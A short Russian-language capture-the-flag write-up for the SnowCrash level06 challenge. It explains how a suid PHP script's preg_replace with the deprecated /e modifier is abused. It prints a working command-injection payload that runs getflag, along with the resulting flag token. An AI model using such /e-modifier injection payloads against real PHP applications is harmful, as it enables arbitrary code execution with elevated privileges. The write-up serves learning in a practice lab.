https://php.ru/manual/reference.pcre.pattern.modifiers.html

В домашнем каталоге у есть исполняемый файл с suid и расширенными разрешениями, а также php-скрипт, позволяющий узнать, что делает исполняемый файл.

-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
    }
function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a;
}
$r = x($argv[1], $argv[2]); print $r;
?>

В первой функции, вызываемой сценарием, используется регулярное выражение с модификатором /e
https://php.ru/manual/reference.pcre.pattern.modifiers.html
"Данная возможность была помечена УСТАРЕВШЕЙ начиная с версии PHP 5.5.0.
Предостережение
Использовать этот модификатор не рекомендуется, так как это может легко добавить уязвимости в системе безопасности"

level06@SnowCrash:~$ echo '[x {${`echo && getflag`}}]' > /tmp/getflag
level06@SnowCrash:~$ ./level06 /tmp/getflag
PHP Notice:  Undefined variable:
Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1

